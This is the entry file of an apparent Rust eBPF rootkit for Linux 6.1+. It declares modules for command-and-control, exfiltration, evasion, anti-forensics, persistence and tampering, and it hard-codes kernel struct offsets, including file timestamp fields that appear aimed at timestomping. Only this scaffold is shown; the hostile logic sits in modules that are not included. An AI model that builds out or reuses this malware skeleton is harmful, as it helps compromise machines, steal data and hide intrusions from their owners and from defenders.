#![no_std]
#![no_main]
#![allow(unused_unsafe)]

mod antiforensics;
mod c2;
mod evasion;
mod exfil;
mod hardware;
mod kernel_evasion;
mod maps;
mod memory;
mod network_covert;
mod persistence;
mod persistence_advanced;
mod tampering;

// ──────────────────────────────────────────────
// Kernel Struct Offsets
// Target: Linux 6.1+ (x86_64). Derived from pahole/BTF.
// These WILL break on other kernel versions without CO-RE/BTF relocation.
// ──────────────────────────────────────────────

pub(crate) const FILE_F_INODE_OFFSET: u64 = 32; // struct file → f_inode
pub(crate) const INODE_I_INO_OFFSET: u64 = 64; // struct inode → i_ino
pub(crate) const PATH_DENTRY_OFFSET: u64 = 8; // struct path → dentry
pub(crate) const DENTRY_D_INODE_OFFSET: u64 = 48; // struct dentry → d_inode
pub(crate) const KSTAT_ATIME_OFFSET: u64 = 72; // struct kstat → atime (timespec64)
pub(crate) const KSTAT_MTIME_OFFSET: u64 = 88; // struct kstat → mtime
pub(crate) const KSTAT_CTIME_OFFSET: u64 = 104; // struct kstat → ctime

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    unsafe { core::hint::unreachable_unchecked() }
}
